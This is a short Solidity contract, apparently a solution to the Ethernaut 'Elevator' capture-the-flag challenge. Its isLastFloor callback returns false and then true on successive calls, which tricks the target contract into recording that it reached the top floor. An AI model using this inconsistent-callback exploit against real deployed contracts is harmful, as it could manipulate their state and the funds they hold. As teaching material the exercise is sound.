// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "./Elevator.sol";


contract ElevatorRepair {
    Elevator public ElevatorContract;
    uint256 count;

    constructor(address _ElevatorContract) {
        ElevatorContract = Elevator(_ElevatorContract);
    }

    function goTolast() external {
        ElevatorContract.goTo(1);
        require(ElevatorContract.top(), "not top");
    }

    function isLastFloor(uint256) external returns (bool) {
        count++;
        return count > 1;
    }
}
